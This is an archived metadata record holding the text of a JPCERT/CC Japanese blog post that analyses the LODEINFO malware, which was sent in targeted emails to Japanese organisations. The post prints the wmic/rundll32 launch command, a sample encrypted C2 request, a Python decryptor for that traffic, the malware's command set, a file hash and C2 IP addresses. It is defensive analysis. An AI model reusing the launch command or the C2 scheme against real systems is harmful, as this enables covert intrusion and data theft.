{
    "id": "20bce312-33cf-4b1e-9b97-0360ee0a2ad3",
    "created_at": "2023-01-12T15:01:42.830819Z",
    "updated_at": "2025-03-27T02:17:02.252507Z",
    "deleted_at": null,
    "sha1_hash": "bfa63324493fb13e7f85849da4ef015099bc936b",
    "title": "2020-02-20 - 日本国内の組織を狙ったマルウエアLODEINFO",
    "authors": "",
    "file_creation_date": "2022-05-28T03:56:05Z",
    "file_modification_date": "2022-05-28T03:56:05Z",
    "file_size": 671685,
    "plain_text": "# 日本国内の組織を狙ったマルウエアLODEINFO - JPCERT/CC Eyes | JPCERTコーディネーションセンター 公式ブログ\n\n**blogs.jpcert.or.jp/ja/2020/02/LODEINFO.html**\n\n喜野 [孝太(Kota Kino)](https://blogs.jpcert.or.jp/ja/kino/)\n\n2020/02/20\n\n## 日本国内の組織を狙ったマルウエアLODEINFO\n\n[LODEINFO](https://blogs.jpcert.or.jp/ja/tags/lodeinfo/)\n\n[メール](http://10.10.0.46/mailto:?subject=%E6%97%A5%E6%9C%AC%E5%9B%BD%E5%86%85%E3%81%AE%E7%B5%84%E7%B9%94%E3%82%92%E7%8B%99%E3%81%A3%E3%81%9F%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A8%E3%82%A2LODEINFO&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fja%2F2020%2F02%2FLODEINFO.html)\n\nJPCERT/CCでは、2019年12月頃に日本国内の組織を狙った標的型攻撃メールを確認してい\nます。\n\n標的型攻撃メールには、これまでJPCERT/CCでは確認していなかった、「LODEINFO」と\n呼ばれる新たなマルウエアに感染させようとする不正なWord文書が添付されていました。\n今回は、新たなマルウエアLODEINFOの詳細について紹介します。\n\n### LODEINFOが動作するまでの流れ\n\n図1は、LODEINFOが動作するまでの流れを示しています。\n\n\n-----\n\n図 1：LODEINFOが動作するまでの流れ\n\nJPCERT/CCが確認した検体では、Word文書のマクロを有効化することでLODEINFOがホス\nト上に作成され、以下のコマンドでrundll32.exeから実行されます。\n```\nwmic process call create \"cmd /c cd %ProgramData%&start rundll32.exe [LODEINFOのファイ\n\n```\nルパス] main\"\n\nその後、LODEINFOはsvchost.exeのプロセスを起動し、ペイロードをインジェクションし\nて動作します。\n\n以降では、インジェクションされた後のLODEINFOの詳細な挙動について解説します。\n\n### LODEINFOの挙動の詳細\n\nLODEINFOは、特定のサイトとHTTPで通信を行い、受信した命令を実行します。\n\n以下は、LODEINFOが送信するHTTP POSTリクエストの例です。\n```\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/77.0.3865.90 Safari/537.36\nHost: [ホスト名]\nContent-Length: 193\nConnection: Keep-Alive\nCache-Control: no-cache\ndata=DIajqcc5lVuJpjwvr36msbQAAADitmc5LmhLlVituiM4OtDohYHRxBJ2R5yWjTYNyBTkUMGD2CPFpZw02\nRQPnYcQeRkqYNOyyRvfhAHSHAFDedFMJlyO1KztS1crvyayyYdL3zmNdE71MsWv2P5PeBzGU_v0EGa0VycSfNe\n\n```\nデータはAESで暗号化した後に、BASE64エンコードされています。データには、\nLODEINFOが動作しているホストのホスト名や言語環境、MACアドレスなどの情報が含ま\nれています。図2は、送信データをデコードした例です。（送信するデータのフォーマット\nについては、Appendix Aをご覧ください）\n\n\n-----\n\n図\n\n2：デコードした送信データの一部\n以下は、HTTP POSTリクエストのデータを復号するコードの一部です。\n```\nfrom Crypto.Cipher import AES\nfrom base64 import urlsafe_b64decode\nfrom binascii import a2b_hex\ndef decypt_lodeinfo_data(enc_data: str, key: bytes, iv: bytes) -> bytes:\n  header_b64 = enc_data[:0x1C]\n  header = urlsafe_b64decode(header_b64.replace(\".\", \"=\"))\n  ## decode with base64\n  postdata_size = int.from_bytes(header[0x10:0x14], byteorder=\"little\")\n  postdata_b64 = enc_data[0x1C:0x1C+postdata_size]\n  postdata = urlsafe_b64decode(postdata_b64.replace(\".\", \"=\"))\n  ## decrypt with AES\n  cipher = AES.new(key, AES.MODE_CBC, iv)\n  decrypt_size = int.from_bytes(postdata[0x30:0x34],byteorder=\"little\")\n  dec_data = cipher.decrypt(postdata[0x34:0x34+decrypt_size])\n  ## remove junk bytes\n  junk_size = dec_data[-1]\n  dec_data = dec_data[:decrypt_size-junk_size]\n  return dec_data\nencrypted_data =\n\"DIajqcc5lVuJpjwvr36msbQAAADitmc5LmhLlVituiM4OtDohYHRxBJ2R5yWjTYNyBTkUMGD2CPFpZw02cwPv\nRQPnYcQeRkqYNOyyRvfhAHSHAFDedFMJlyO1KztS1crvyayyYdL3zmNdE71MsWv2P5PeBzGU_v0EGa0VycSfNe\nKEY = a2b_hex(\"E20EF6C66A838DA222821DB1C5777251F1A9D5D14D2344CED68A353BFCAC4C5A\")\nIV = a2b_hex(\"CC45ABAD58152C6150F157367ECC53F3\")\ndecrypted_data = decypt_lodeinfo_data(encrypted_data, KEY,IV) \nprint(\"Decrypted Data: \", bytes.hex(decrypted_data))\n\n```\n次に、LODEINFOはコマンドを受信します。C&Cサーバからのレスポンスは、HTTP POST\nリクエストと同様に、AESとBASE64を組み合わせて暗号化が行われています。LODEINFO\nは受信したコマンドに応じて、以下の機能などを実行します。（コマンドの詳細については\nAppendix Bをご覧ください）\n\nPEファイルの実行\nシェルコードの実行\n\n\n-----\n\nファイルのアップロード・ダウンロード\nプロセスの停止\nファイル一覧の送信\nマルウエアバージョン情報の送信\n\n### LODEINFOで利用されているコード\n\nLODEINFOを分析した結果、GitHub上で公開されているLodePNG[1]と呼ばれるPNGファイ\nルのエンコーダー/デコーダーのソースコードと類似する部分が多数あることを確認しまし\nた。ただし、LodePNGの機能を悪用している箇所は確認できていないため、攻撃者が当該\nコードを利用している理由については不明です。\n\n### おわりに\n\nLODEINFOには、複数の箇所でデバッグ用と思われる文字列が記載されている他、バージョ\nン情報としてv0.1.2といった文字列が確認でき、現在も開発途中の可能性があります。今後\nもLODEINFOを利用した攻撃が続く可能性もあるため、注意が必要です。\n\nなお、今回解説したLODEINFOと類似する検体のハッシュ値をAppendix C、確認した通信\n先をAppendix Dに記載しています。 Appendix Dの通信先に対して通信が発生していないか\nをご確認ください。\n\nインシデントレスポンスグループ 喜野 孝太\n\n参考情報\n\n[1] GitHub: LodePNG - PNG encoder and decoder in C and C++\n\n[https://github.com/lvandeve/lodepng](https://github.com/lvandeve/lodepng)\n\n**Appendix A 送受信データの内容**\n\n表 A-1:データフォーマット（BASE64デコード後）\n\nオフセット 長さ 内容\n\n0x00 16 AESキーのSHA512値（先頭16byte）\n\n0x10 4 0x15以降のデータをBASE64エンコードしたサイズ\n\n0x14 1 不明\n\n0x15 48 AESで暗号化される前のデータのSHA512値（先頭48byte）\n\n0x45 4 AESで暗号化されたデータのサイズ\n\n0x49 可変 AESで暗号化されたデータ\n\n\n-----\n\n表 A-2:BASE64デコードした送信データの例\n\n**Appendix B コマンド一覧**\n\n表 B: コマンド一覧\n\n値 内容\n\nMZ PEファイルの実行\n\n0xE9 シェルコードの実行\n\ncd カレントディレクトリの変更\n\nls ファイル一覧の送信\n\nsend ファイルダウンロード\n\nrecv ファイルアップロード\n\ncat ファイルアップロード\n\nmemory シェルコードの実行（svchost.exeにインジェクション）\n\nkill 任意プロセスの停止\n\nver マルウエアバージョン情報の送信\n\n**Appendix C 検体のハッシュ値**\n\nb50d83820a5704522fee59164d7bc69bea5c834ebd9be7fd8ad35b040910807f\n\n**Appendix D 通信先**\n\n45.67.231.169\n162.244.32.148\n\n\n-----\n\n193.228.52.57\n\n[メール](http://10.10.0.46/mailto:?subject=%E6%97%A5%E6%9C%AC%E5%9B%BD%E5%86%85%E3%81%AE%E7%B5%84%E7%B9%94%E3%82%92%E7%8B%99%E3%81%A3%E3%81%9F%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A8%E3%82%A2LODEINFO&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fja%2F2020%2F02%2FLODEINFO.html)\n\nこの記事の筆者\n\n喜野 [孝太(Kota Kino)](https://blogs.jpcert.or.jp/ja/kino/)\n\n2019年8月より現職。主に、マルウェア分析・フォレンジック調査に従事。\n\nこのページは役に立ちましたか？\n\n0人が「このページが役に立った」と言っています。\n\nその他、ご意見・ご感想などございましたら、ご記入ください。\n\nこちらはご意見・ご感想用のフォームです。各社製品については、各社へお問い合わせくだ\nさい。\n\njavascriptを有効にすると、ご回答いただけます。 ありがとうございました。\n\n## 関連記事\n\nHUI Loaderの分析\n\nAnti-UPX Unpackingテクニック\n\n\n-----\n\nモバイル端末を狙うマルウェアへの対応FAQ\n\n攻撃グループLuoYuが使用するマルウェアWinDealer\n\n攻撃グループBlackTechが使用するマルウェアGh0stTimes\n\n≪ [前へ](https://blogs.jpcert.or.jp/ja/2020/02/japan-security-analyst-conference-2020-2.html)\n[トップに戻る](https://blogs.jpcert.or.jp/ja/)\n[次へ](https://blogs.jpcert.or.jp/ja/2020/02/elf_tscookie.html) ≫\n\n\n-----",
    "language": "JA",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-20 - 日本国内の組織を狙ったマルウエアLODEINFO.pdf"
    ],
    "report_names": [
        "2020-02-20 - 日本国内の組織を狙ったマルウエアLODEINFO.pdf"
    ],
    "threat_actors": [
        {
            "id": "2646f776-792a-4498-967b-ec0d3498fdf1",
            "created_at": "2022-10-25T15:50:23.475784Z",
            "updated_at": "2025-03-27T02:00:55.479958Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Palmerworm"
            ],
            "source_name": "MITRE:BlackTech",
            "tools": [
                "Kivars",
                "PsExec",
                "TSCookie",
                "Flagpro",
                "Waterbear"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d3a7123c-f519-49a0-a234-de24a1ef052a",
            "created_at": "2022-10-25T16:47:55.545211Z",
            "updated_at": "2025-03-27T02:05:17.254744Z",
            "deleted_at": null,
            "main_name": "BRONZE CANAL",
            "aliases": [
                "CTG-6177 ",
                "Circuit Panda ",
                "Palmerworm ",
                "Shrouded Crossbow ",
                "BlackTech"
            ],
            "source_name": "Secureworks:BRONZE CANAL",
            "tools": [
                " DRIGO",
                " Flagpro",
                " Gh0stTimes",
                " PLEAD",
                " Spiderpig",
                " Waterbear",
                "Bifrose"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75024aad-424b-449a-b286-352fe9226bcb",
            "created_at": "2023-01-06T13:46:38.962724Z",
            "updated_at": "2025-03-27T02:00:02.964002Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "CIRCUIT PANDA",
                "Temp.Overboard",
                "G0098",
                "Red Djinn",
                "HUAPI",
                "Palmerworm",
                "T-APT-03",
                "Manga Taurus",
                "Earth Hundun"
            ],
            "source_name": "MISPGALAXY:BlackTech",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "efa7c047-b61c-4598-96d5-e00d01dec96b",
            "created_at": "2022-10-25T16:07:23.404442Z",
            "updated_at": "2025-03-27T02:02:09.781478Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Circuit Panda",
                "Earth Hundun",
                "Manga Taurus",
                "Operation PLEAD",
                "Operation Shrouded Crossbow",
                "Operation Waterbear",
                "Palmerworm",
                "Radio Panda",
                "Red Djinn",
                "T-APT-03",
                "TEMP.Overboard"
            ],
            "source_name": "ETDA:BlackTech",
            "tools": [
                "BIFROST",
                "BUSYICE",
                "BendyBear",
                "Bluether",
                "CAPGELD",
                "DRIGO",
                "Deuterbear",
                "Flagpro",
                "GOODTIMES",
                "Gh0stTimes",
                "IconDown",
                "KIVARS",
                "LOLBAS",
                "LOLBins",
                "Linopid",
                "Living off the Land",
                "TSCookie",
                "Waterbear",
                "XBOW",
                "elf.bifrose"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b72c2616-cc7c-4c47-a83d-6b7866b94746",
            "created_at": "2023-01-06T13:46:39.425297Z",
            "updated_at": "2025-03-27T02:00:03.08718Z",
            "deleted_at": null,
            "main_name": "Red Nue",
            "aliases": [
                "LuoYu"
            ],
            "source_name": "MISPGALAXY:Red Nue",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535702,
    "ts_updated_at": 1743041822,
    "ts_creation_date": 1653710165,
    "ts_modification_date": 1653710165,
    "files": {
        "pdf": "https://archive.orkl.eu/bfa63324493fb13e7f85849da4ef015099bc936b.pdf",
        "text": "https://archive.orkl.eu/bfa63324493fb13e7f85849da4ef015099bc936b.txt",
        "img": "https://archive.orkl.eu/bfa63324493fb13e7f85849da4ef015099bc936b.jpg"
    }
}